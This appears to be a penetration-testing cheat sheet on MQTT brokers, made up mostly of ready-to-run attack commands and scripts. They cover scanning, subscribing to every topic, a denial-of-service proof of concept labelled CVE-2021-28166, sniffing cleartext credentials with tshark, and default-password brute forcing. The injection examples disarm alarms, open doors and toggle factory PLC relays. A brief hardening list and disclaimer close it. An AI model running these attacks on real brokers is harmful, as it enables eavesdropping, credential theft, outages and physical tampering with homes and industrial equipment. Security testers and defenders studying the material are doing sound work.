---
title: "MQTT Protocol"
date: 2026-02-24
draft: false
---

## Overview

MQTT (Message Queuing Telemetry Transport) is a lightweight publish-subscribe messaging protocol designed for IoT devices, sensor networks, and machine-to-machine communication. It runs over TCP and is commonly deployed in smart home systems, industrial IoT, healthcare devices, fleet management, and building automation. MQTT brokers are frequently exposed with no authentication, and even when authentication is enabled, it is often transmitted in cleartext. Unauthenticated MQTT access can expose sensitive sensor data, device commands, and organizational operational data.

**Default Ports:**
| Port | Service |
|------|---------|
| 1883 | MQTT (unencrypted) |
| 8883 | MQTT over TLS |
| 9001 | MQTT over WebSocket |
| 8084 | MQTT over WebSocket TLS |

---

## Protocol Overview

MQTT uses a broker-based publish-subscribe model:

| Concept | Description |
|---------|-------------|
| Broker | Central message router (Eclipse Mosquitto, EMQX, HiveMQ, VerneMQ) |
| Client | Publisher or subscriber |
| Topic | Hierarchical path string (e.g., `home/bedroom/temperature`) |
| QoS | Quality of Service level (0, 1, 2) |
| Retain | Last message stored by broker, delivered to new subscribers |
| Will | Message published when client disconnects unexpectedly |

### Topic Wildcards

| Wildcard | Level | Example | Matches |
|----------|-------|---------|---------|
| `+` | Single level | `home/+/temp` | `home/bedroom/temp`, `home/kitchen/temp` |
| `#` | Multi-level | `home/#` | All topics under `home/` |
| `#` alone | All topics | `#` | Every topic on the broker |

---

## Recon and Fingerprinting

### Nmap

```bash
nmap -sV -p 1883,8883,9001 TARGET_IP
nmap -p 1883 --script mqtt-subscribe TARGET_IP
```

### Banner and Version Detection

```bash
# TCP banner grab
nc TARGET_IP 1883 -q 3 | xxd | head

# MQTT CONNECT packet (minimal)
python3 -c "
import socket, struct

# MQTT CONNECT packet — minimal unauthenticated
def make_connect(client_id=b'probe'):
    # Fixed header
    fixed = bytes([0x10])  # CONNECT
    # Variable header
    proto_name = b'\x00\x04MQTT'
    proto_version = bytes([0x04])  # MQTT 3.1.1
    conn_flags = bytes([0x02])  # Clean session
    keepalive = struct.pack('>H', 60)
    # Payload
    client_id_enc = struct.pack('>H', len(client_id)) + client_id
    payload = client_id_enc
    # Remaining length
    var_header = proto_name + proto_version + conn_flags + keepalive
    remaining = var_header + payload
    # Encode remaining length
    rem_len = len(remaining)
    encoded_len = bytes([rem_len]) if rem_len < 128 else bytes([0x80 | (rem_len & 0x7F), rem_len >> 7])
    return fixed + encoded_len + remaining

s = socket.socket()
s.settimeout(5)
s.connect(('TARGET_IP', 1883))
s.send(make_connect())
resp = s.recv(64)
print('Response:', resp.hex())
# CONNACK: 0x20 0x02 0x00 0x00 = Connected OK
# 0x20 0x02 0x00 0x05 = Not Authorized
if resp[3:4] == bytes([0x00]):
    print('[+] UNAUTHENTICATED ACCESS ALLOWED')
elif resp[3:4] == bytes([0x05]):
    print('[-] Authentication required')
else:
    print('[?] Unknown response:', resp[3:4].hex())
s.close()
"
```

---

## Unauthenticated Broker Access

### mosquitto_sub — Subscribe to All Topics

```bash
# Subscribe to ALL topics (the # wildcard)
mosquitto_sub -h TARGET_IP -p 1883 -t "#" -v

# Subscribe to all topics with metadata
mosquitto_sub -h TARGET_IP -p 1883 -t "#" -v -d

# Subscribe to specific pattern
mosquitto_sub -h TARGET_IP -p 1883 -t "home/#" -v
mosquitto_sub -h TARGET_IP -p 1883 -t "+/+/temperature" -v

# Retain messages only (existing stored messages)
mosquitto_sub -h TARGET_IP -p 1883 -t "#" --retained-only -v

# With client ID
mosquitto_sub -h TARGET_IP -p 1883 -t "#" -v -i "monitor_client"

# Verbose with timestamps
mosquitto_sub -h TARGET_IP -p 1883 -t "#" -v -F "@Y-%m-%dT%H:%M:%S %t %p"
```

### Topic Enumeration Strategy

```bash
# Start broad, narrow down
mosquitto_sub -h TARGET_IP -t "#" -v -C 1000 &
SUBPID=$!
sleep 30
kill $SUBPID

# Parse unique topics
mosquitto_sub -h TARGET_IP -t "#" -v 2>/dev/null | awk '{print $1}' | sort -u > discovered_topics.txt
echo "Discovered $(wc -l < discovered_topics.txt) unique topics"

# Second pass — subscribe to all discovered topics
while read topic; do
  mosquitto_sub -h TARGET_IP -t "$topic" -v -C 1 2>/dev/null >> topic_values.txt
done < discovered_topics.txt
```

---

## CVE-2021-28166 — Eclipse Mosquitto Memory Leak

**CVSS:** 7.5 High
**Affected:** Eclipse Mosquitto 2.0.0 to 2.0.9
**Type:** Denial of Service via CONNECT packet processing
**CWE:** CWE-400

### Vulnerability Details

A specially crafted MQTT CONNECT packet with a will topic that has specific encoding properties caused Mosquitto to crash or leak memory, enabling denial of service. No authentication was required, making any exposed Mosquitto broker vulnerable.

### PoC — DoS Trigger

```python
#!/usr/bin/env python3
"""
CVE-2021-28166 Mosquitto DoS PoC
Sends malformed CONNECT with crafted will topic
WARNING: May cause service crash
"""
import socket
import struct

TARGET = "TARGET_IP"
PORT = 1883

def craft_connect_with_will():
    # MQTT CONNECT with will message containing oversized/malformed topic
    proto_name = b'\x00\x04MQTT'
    proto_version = bytes([0x04])
    # Connect flags: Clean session + Will flag + Will QoS 1
    conn_flags = bytes([0b00001110])
    keepalive = struct.pack('>H', 60)

    # Client ID
    client_id = b'cve_2021_28166'

    # Will topic — crafted to trigger the bug (null bytes / specific encoding)
    will_topic = b'\x00' * 2 + b'test'  # Malformed will topic prefix
    will_message = b'test_message'

    def encode_utf8(s):
        return struct.pack('>H', len(s)) + s

    var_header = proto_name + proto_version + conn_flags + keepalive
    payload = (encode_utf8(client_id) +
               encode_utf8(will_topic) +
               encode_utf8(will_message))

    remaining = var_header + payload
    rem_len = len(remaining)

    packet = bytes([0x10, rem_len]) + remaining
    return packet

try:
    s = socket.socket()
    s.settimeout(5)
    s.connect((TARGET, PORT))
    pkt = craft_connect_with_will()
    s.send(pkt)
    resp = s.recv(10)
    print(f"Response: {resp.hex()}")
    s.close()
except Exception as e:
    print(f"[+] Possible crash (DoS): {e}")
```

---

## Credential Sniffing

MQTT 3.x transmits credentials in cleartext. Username/password are in the CONNECT packet body.

### Wireshark Filter

```
# Filter for MQTT CONNECT packets (contains credentials)
mqtt.msgtype == 1

# MQTT over port 1883
tcp.port == 1883 && mqtt

# Extract username/password
mqtt.username
mqtt.password
```

### tshark Credential Extraction

```bash
# Capture and extract MQTT credentials in real time
tshark -i eth0 -f "tcp port 1883" \
  -T fields \
  -e mqtt.username \
  -e mqtt.password \
  -Y "mqtt.msgtype == 1"

# From pcap file
tshark -r capture.pcap -T fields -e mqtt.username -e mqtt.password -Y "mqtt.msgtype == 1"

# Live capture to file
tcpdump -i eth0 -w mqtt_capture.pcap port 1883
# Then analyze with tshark
```

---

## Publishing to Sensitive Topics

### mosquitto_pub — Message Injection

```bash
# Publish to a topic (unauthenticated)
mosquitto_pub -h TARGET_IP -p 1883 -t "home/alarm/status" -m "disarmed"

# Publish JSON payload
mosquitto_pub -h TARGET_IP -p 1883 -t "device/sensor/config" \
  -m '{"enabled": false, "threshold": 9999}'

# Publish with retain (persistent)
mosquitto_pub -h TARGET_IP -p 1883 -t "home/doors/front" -m "OPEN" --retain

# Publish to command topics
mosquitto_pub -h TARGET_IP -p 1883 -t "device/DEVICE_ID/cmd" -m "reboot"
mosquitto_pub -h TARGET_IP -p 1883 -t "factory/plc1/output/relay1" -m "1"

# High QoS injection
mosquitto_pub -h TARGET_IP -p 1883 -t "target/topic" -m "payload" -q 2
```

### Dangerous Topic Patterns

```bash
# IoT device command patterns
TOPICS=(
  "cmd/+"
  "+/cmd"
  "+/command"
  "+/control"
  "+/set"
  "+/config"
  "device/+/cmd"
  "homeassistant/+/+/set"
  "zigbee2mqtt/+/set"
  "tasmota/+/cmnd/+"
  "sonoff/+/command/+"
)

for topic in "${TOPICS[@]}"; do
  mosquitto_sub -h TARGET_IP -t "$topic" -v -C 5 2>/dev/null &
done
wait
```

---

## mqtt-pwn — Automated MQTT Assessment

```bash
# Install
git clone https://github.com/akamai-threat-research/mqtt-pwn.git
cd mqtt-pwn && pip3 install -r requirements.txt

# Interactive shell
python3 mqtt-pwn.py

# Inside mqtt-pwn:
# connect -b TARGET_IP
# discover  (subscribe to # and enumerate topics)
# publish -t topic -m message
# brute (credential brute force)
```

---

## Python MQTT Full Assessment

```python
#!/usr/bin/env python3
"""
MQTT Security Assessment Tool
"""
import paho.mqtt.client as mqtt
import json
import time
import sys
from collections import defaultdict

TARGET = sys.argv[1] if len(sys.argv) > 1 else "TARGET_IP"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1883

discovered_topics = defaultdict(list)
credentials = []
sensitive_keywords = ['password', 'token', 'secret', 'credential', 'key', 'auth',
                      'admin', 'root', 'user', 'email', 'config', 'alarm', 'door',
                      'lock', 'camera', 'gps', 'location', 'health', 'medical']

def on_connect(client, userdata, flags, rc):
    status = {
        0: "[+] Connected (no auth required!)",
        1: "[-] Wrong protocol version",
        2: "[-] Invalid client ID",
        3: "[-] Broker unavailable",
        4: "[-] Wrong credentials",
        5: "[-] Not authorized",
    }
    print(status.get(rc, f"[?] Unknown: {rc}"))
    if rc == 0:
        client.subscribe("#")
        print("[*] Subscribed to # (all topics)")

def on_message(client, userdata, msg):
    topic = msg.topic
    try:
        payload = msg.payload.decode('utf-8', errors='replace')
    except Exception:
        payload = msg.payload.hex()

    discovered_topics[topic].append(payload)

    # Flag sensitive content
    lower_payload = payload.lower()
    lower_topic = topic.lower()
    for kw in sensitive_keywords:
        if kw in lower_topic or kw in lower_payload:
            print(f"[!] SENSITIVE: {topic} = {payload[:200]}")
            break

def on_disconnect(client, userdata, rc):
    print(f"[*] Disconnected: {rc}")

client = mqtt.Client(client_id="assessment_client")
client.on_connect = on_connect
client.on_message = on_message
client.on_disconnect = on_disconnect

print(f"[*] Connecting to {TARGET}:{PORT}")
try:
    client.connect(TARGET, PORT, 60)
    client.loop_start()
    time.sleep(60)  # Collect for 60 seconds
    client.loop_stop()
    client.disconnect()
except Exception as e:
    print(f"[-] Connection failed: {e}")
    sys.exit(1)

print(f"\n[+] Assessment complete. Discovered {len(discovered_topics)} unique topics.")

# Output report
report = {
    "target": f"{TARGET}:{PORT}",
    "topics_discovered": len(discovered_topics),
    "topics": dict(discovered_topics)
}

with open("mqtt_assessment.json", "w") as f:
    json.dump(report, f, indent=2)
print("[+] Report saved to mqtt_assessment.json")
```

---

## Credential Brute Force

```bash
# Using mqtt-pwn brute force
# Or manual with mosquitto_sub

# Test with credentials
mosquitto_sub -h TARGET_IP -p 1883 -t "#" -v \
  -u "admin" -P "admin" -C 5 2>&1

mosquitto_sub -h TARGET_IP -p 1883 -t "#" -v \
  -u "user" -P "password" -C 5 2>&1

# Python brute force
python3 -c "
import paho.mqtt.client as mqtt
import time

CREDS = [('admin','admin'), ('user','user'), ('mqtt','mqtt'), ('admin','password'), ('guest','guest'), ('test','test')]
TARGET = 'TARGET_IP'
PORT = 1883

for user, pwd in CREDS:
    result = [None]
    def on_connect(c, u, f, rc):
        result[0] = rc
    c = mqtt.Client()
    c.username_pw_set(user, pwd)
    c.on_connect = on_connect
    try:
        c.connect(TARGET, PORT, 5)
        c.loop_start()
        time.sleep(2)
        c.loop_stop()
        c.disconnect()
    except Exception:
        pass
    print(f'{user}:{pwd} -> RC={result[0]}', '[+] VALID!' if result[0]==0 else '')
"
```

---

## MQTT Explorer

For graphical assessment, MQTT Explorer provides a GUI for browsing topic hierarchies, viewing message history, and publishing test messages. Available at https://mqtt-explorer.com/

---

## Hardening Recommendations

- Enable authentication: configure `password_file` in `mosquitto.conf`
- Use TLS (port 8883): configure `cafile`, `certfile`, `keyfile`
- Restrict topic access with ACL file: `acl_file` in `mosquitto.conf`
- Disable anonymous access: `allow_anonymous false`
- Upgrade Eclipse Mosquitto to 2.0.15+ to patch CVE-2021-28166 and related
- Use MQTT 5.0 enhanced authentication mechanisms
- Implement topic-level authorization (clients should only publish/subscribe to their own topics)
- Network-segment MQTT brokers — IoT devices should not directly access business systems
- Monitor for `#` wildcard subscriptions — flag these as anomalous
- Use client certificates for device authentication (mTLS)


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.